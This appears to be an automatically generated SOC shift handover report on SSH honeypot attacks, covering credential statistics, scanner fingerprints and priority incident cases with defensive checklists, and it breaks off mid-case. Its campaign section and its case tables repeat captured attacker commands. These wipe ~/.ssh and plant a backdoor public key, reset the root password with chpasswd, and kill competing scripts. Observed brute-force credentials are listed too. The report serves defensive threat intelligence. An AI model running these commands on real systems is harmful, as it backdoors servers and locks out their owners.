# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T13:43:40Z |
| **Shift Time** | 13:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **122** |
| Confirmed Threats | **76** |
| False Positives Filtered | **46** (37.7%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **20** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **103** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **37** |
| Unique Credential Pairs | **22** |
| Unique Usernames | **10** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `345gs5662d34` | 9 |
| `pi` | 2 |
| `ubuntu` | 1 |
| `admin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 8 |
| `admin` | 2 |
| `123qwe123` | 1 |
| `raspberryraspberry993311` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 8 |
| `ubuntu` | `123qwe123` | 1 |
| `pi` | `raspberryraspberry993311` | 1 |
| `pi` | `raspberry` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abc@123456789` | `183.166.94.133` | 2026-05-23T12:02:30 |
| `root` | `admin` | `116.110.2.158` | 2026-05-23T12:44:44 |
| `root` | `passw0rd!` | `101.36.111.119` | 2026-05-23T13:08:06 |
| `root` | `3245gs5662d34` | `101.36.111.119` | 2026-05-23T13:08:09 |
| `root` | `ubuntu` | `143.198.221.188` | 2026-05-23T13:13:56 |
| `root` | `toor1234` | `197.153.57.103` | 2026-05-23T13:15:13 |
| `root` | `3245gs5662d34` | `197.153.57.103` | 2026-05-23T13:15:18 |
| `root` | `Password2026` | `197.153.57.103` | 2026-05-23T13:17:02 |
| `root` | `Win@2026` | `197.153.57.103` | 2026-05-23T13:18:59 |
| `root` | `Win@2024` | `197.153.57.103` | 2026-05-23T13:24:03 |
| `root` | `Admin123456.` | `197.153.57.103` | 2026-05-23T13:27:38 |
| `root` | `Gr123456@` | `197.153.57.103` | 2026-05-23T13:29:25 |
| `root` | `Qwer1234@` | `197.153.57.103` | 2026-05-23T13:31:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **122** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 34 |
| Go SSH scanner | 5 |
| AsyncSSH (Python) | 4 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 25 | 1 |
| `f555226df196...` | Mirai/variant | 8 | 4 |
| `fda360b1b4f4...` | Mirai/variant | 4 | 1 |
| `ec7378c1a92f...` | Generic scanner | 2 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 25 | 1 | libssh-based |
| `f555226df196...` | libssh | 8 | 4 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 4 | 1 | Mirai/variant |
| `ec7378c1a92f...` | OpenSSH | 2 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:h6C4jA9hfaT2"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.166.94.133`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.153.57.103`, `101.36.111.119`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **30** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8167` | V tal | 1 | LOW |
| `AS36925` | MEDITELECOM | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS12389` | PJSC Rostelecom | 1 | LOW |
| `AS24086` | Viettel Corporation | 1 | HIGH |
| `AS17676` | SoftBank Corp. | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (19)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b61d5391e9c9

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-23 12:02 |
| **Last Seen** | 2026-05-23 12:02 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:h6C4jA9hfaT2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 12:02:30` | `cowrie.session.connect` |
| `2026-05-23 12:02:30` | `cowrie.client.version` |
| `2026-05-23 12:02:30` | `cowrie.client.kex` |
| `2026-05-23 12:02:30` | `cowrie.login.success` |
| `2026-05-23 12:02:31` | `cowrie.session.params` |
| `2026-05-23 12:02:31` | `cowrie.command.input` |
| `2026-05-23 12:02:31` | `cowrie.command.failed` |
| `2026-05-23 12:02:31` | `cowrie.log.closed` |
| `2026-05-23 12:02:31` | `cowrie.session.params` |
| `2026-05-23 12:02:31` | `cowrie.command.input` |
| `2026-05-23 12:02:31` | `cowrie.session.file_download` |
| `2026-05-23 12:02:31` | `cowrie.log.closed` |
| `2026-05-23 12:02:48` | `cowrie.session.params` |
| `2026-05-23 12:02:48` | `cowrie.command.input` |
| `2026-05-23 12:02:48` | `cowrie.log.closed` |
| `2026-05-23 12:02:48` | `cowrie.session.params` |
| `2026-05-23 12:02:48` | `cowrie.command.input` |
| `2026-05-23 12:02:49` | `cowrie.log.closed` |
| `2026-05-23 12:02:49` | `cowrie.session.params` |
| `2026-05-23 12:02:49` | `cowrie.command.input` |
| `2026-05-23 12:02:49` | `cowrie.session.file_download` |
| `2026-05-23 12:02:49` | `cowrie.log.closed` |
| `2026-05-23 12:02:49` | `cowrie.session.params` |
| `2026-05-23 12:02:49` | `cowrie.command.input` |
| `2026-05-23 12:02:50` | `cowrie.log.closed` |
| `2026-05-23 12:02:50` | `cowrie.session.params` |
| `2026-05-23 12:02:50` | `cowrie.command.input` |
| `2026-05-23 12:02:50` | `cowrie.log.closed` |
| `2026-05-23 12:02:50` | `cowrie.session.params` |
| `2026-05-23 12:02:50` | `cowrie.command.input` |
| `2026-05-23 12:02:50` | `cowrie.command.input` |
| `2026-05-23 12:02:51` | `cowrie.log.closed` |
| `2026-05-23 12:02:51` | `cowrie.session.params` |
| `2026-05-23 12:02:51` | `cowrie.command.input` |
| `2026-05-23 12:02:51` | `cowrie.log.closed` |
| `2026-05-23 12:02:51` | `cowrie.session.params` |
| `2026-05-23 12:02:51` | `cowrie.command.input` |
| `2026-05-23 12:02:51` | `cowrie.log.closed` |
| `2026-05-23 12:02:52` | `cowrie.session.params` |
| `2026-05-23 12:02:52` | `cowrie.command.input` |
| `2026-05-23 12:02:52` | `cowrie.log.closed` |
| `2026-05-23 12:02:52` | `cowrie.session.params` |
| `2026-05-23 12:02:52` | `cowrie.command.input` |
| `2026-05-23 12:02:52` | `cowrie.log.closed` |
| `2026-05-23 12:02:53` | `cowrie.session.params` |
| `2026-05-23 12:02:53` | `cowrie.command.input` |
| `2026-05-23 12:02:53` | `cowrie.log.closed` |
| `2026-05-23 12:02:53` | `cowrie.session.params` |
| `2026-05-23 12:02:53` | `cowrie.command.input` |
| `2026-05-23 12:02:53` | `cowrie.log.closed` |
| `2026-05-23 12:02:54` | `cowrie.session.params` |
| `2026-05-23 12:02:54` | `cowrie.command.input` |
| `2026-05-23 12:02:54` | `cowrie.log.closed` |
| `2026-05-23 12:02:54` | `cowrie.session.params` |
| `2026-05-23 12:02:54` | `cowrie.command.input` |
| `2026-05-23 12:02:54` | `cowrie.log.closed` |
| `2026-05-23 12:02:54` | `cowrie.session.params` |
| `2026-05-23 12:02:54` | `cowrie.command.input` |
| `2026-05-23 12:02:55` | `cowrie.log.closed` |
| `2026-05-23 12:02:55` | `cowrie.session.params` |
| `2026-05-23 12:02:55` | `cowrie.command.input` |
| `2026-05-23 12:02:55` | `cowrie.log.closed` |
| `2026-05-23 12:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361b41356d17

| Field | Detail |
|---|---|
| **Source IP** | `116.110.2[.]158` |
| **First Seen** | 2026-05-23 12:44 |
| **Last Seen** | 2026-05-23 12:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 12:44:41` | `cowrie.session.connect` |
| `2026-05-23 12:44:41` | `cowrie.client.version` |
| `2026-05-23 12:44:42` | `cowrie.client.kex` |
| `2026-05-23 12:44:44` | `cowrie.login.success` |
| `2026-05-23 12:44:44` | `cowrie.direct-tcpip.request` |
| `2026-05-23 12:44:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-23 12:44:45` | `cowrie.direct-tcpip.data` |
| `2026-05-23 12:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.2[.]158` to AbuseIPDB if not already reported
- [ ] Block `116.110.2[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4bab45fe7f1

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 13:08 |
| **Last Seen** | 2026-05-23 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:08:06` | `cowrie.session.connect` |
| `2026-05-23 13:08:06` | `cowrie.client.version` |
| `2026-05-23 13:08:06` | `cowrie.client.kex` |
| `2026-05-23 13:08:06` | `cowrie.login.success` |
| `2026-05-23 13:08:07` | `cowrie.session.params` |
| `2026-05-23 13:08:07` | `cowrie.command.input` |
| `2026-05-23 13:08:07` | `cowrie.command.failed` |
| `2026-05-23 13:08:07` | `cowrie.log.closed` |
| `2026-05-23 13:08:07` | `cowrie.session.params` |
| `2026-05-23 13:08:07` | `cowrie.command.input` |
| `2026-05-23 13:08:07` | `cowrie.session.file_download` |
| `2026-05-23 13:08:07` | `cowrie.log.closed` |
| `2026-05-23 13:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8a0a1c34d5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-23 13:08 |
| **Last Seen** | 2026-05-23 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:08:09` | `cowrie.session.connect` |
| `2026-05-23 13:08:09` | `cowrie.client.version` |
| `2026-05-23 13:08:09` | `cowrie.client.kex` |
| `2026-05-23 13:08:09` | `cowrie.login.success` |
| `2026-05-23 13:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb58551976a

| Field | Detail |
|---|---|
| **Source IP** | `143.198.221[.]188` |
| **First Seen** | 2026-05-23 13:13 |
| **Last Seen** | 2026-05-23 13:14 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:13:55` | `cowrie.session.connect` |
| `2026-05-23 13:13:55` | `cowrie.client.version` |
| `2026-05-23 13:13:56` | `cowrie.client.kex` |
| `2026-05-23 13:13:56` | `cowrie.login.success` |
| `2026-05-23 13:14:16` | `cowrie.session.file_upload` |
| `2026-05-23 13:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.221[.]188` to AbuseIPDB if not already reported
- [ ] Block `143.198.221[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea6139bbc13

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:15 |
| **Last Seen** | 2026-05-23 13:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:15:12` | `cowrie.session.connect` |
| `2026-05-23 13:15:12` | `cowrie.client.version` |
| `2026-05-23 13:15:12` | `cowrie.client.kex` |
| `2026-05-23 13:15:13` | `cowrie.login.success` |
| `2026-05-23 13:15:14` | `cowrie.session.params` |
| `2026-05-23 13:15:14` | `cowrie.command.input` |
| `2026-05-23 13:15:14` | `cowrie.command.failed` |
| `2026-05-23 13:15:14` | `cowrie.log.closed` |
| `2026-05-23 13:15:14` | `cowrie.session.params` |
| `2026-05-23 13:15:14` | `cowrie.command.input` |
| `2026-05-23 13:15:14` | `cowrie.session.file_download` |
| `2026-05-23 13:15:14` | `cowrie.log.closed` |
| `2026-05-23 13:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e596764b5573

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:15 |
| **Last Seen** | 2026-05-23 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:15:17` | `cowrie.session.connect` |
| `2026-05-23 13:15:17` | `cowrie.client.version` |
| `2026-05-23 13:15:17` | `cowrie.client.kex` |
| `2026-05-23 13:15:18` | `cowrie.login.success` |
| `2026-05-23 13:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-681f84c9e774

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:17 |
| **Last Seen** | 2026-05-23 13:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:17:01` | `cowrie.session.connect` |
| `2026-05-23 13:17:01` | `cowrie.client.version` |
| `2026-05-23 13:17:02` | `cowrie.client.kex` |
| `2026-05-23 13:17:02` | `cowrie.login.success` |
| `2026-05-23 13:17:03` | `cowrie.session.params` |
| `2026-05-23 13:17:03` | `cowrie.command.input` |
| `2026-05-23 13:17:03` | `cowrie.command.failed` |
| `2026-05-23 13:17:03` | `cowrie.log.closed` |
| `2026-05-23 13:17:03` | `cowrie.session.params` |
| `2026-05-23 13:17:03` | `cowrie.command.input` |
| `2026-05-23 13:17:04` | `cowrie.session.file_download` |
| `2026-05-23 13:17:04` | `cowrie.log.closed` |
| `2026-05-23 13:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8532c40795c6

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:17 |
| **Last Seen** | 2026-05-23 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:17:06` | `cowrie.session.connect` |
| `2026-05-23 13:17:06` | `cowrie.client.version` |
| `2026-05-23 13:17:06` | `cowrie.client.kex` |
| `2026-05-23 13:17:07` | `cowrie.login.success` |
| `2026-05-23 13:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-076b84d27e89

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:18 |
| **Last Seen** | 2026-05-23 13:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:18:58` | `cowrie.session.connect` |
| `2026-05-23 13:18:58` | `cowrie.client.version` |
| `2026-05-23 13:18:58` | `cowrie.client.kex` |
| `2026-05-23 13:18:59` | `cowrie.login.success` |
| `2026-05-23 13:19:00` | `cowrie.session.params` |
| `2026-05-23 13:19:00` | `cowrie.command.input` |
| `2026-05-23 13:19:00` | `cowrie.command.failed` |
| `2026-05-23 13:19:00` | `cowrie.log.closed` |
| `2026-05-23 13:19:00` | `cowrie.session.params` |
| `2026-05-23 13:19:00` | `cowrie.command.input` |
| `2026-05-23 13:19:00` | `cowrie.session.file_download` |
| `2026-05-23 13:19:00` | `cowrie.log.closed` |
| `2026-05-23 13:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063d6e8947b8

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:19 |
| **Last Seen** | 2026-05-23 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
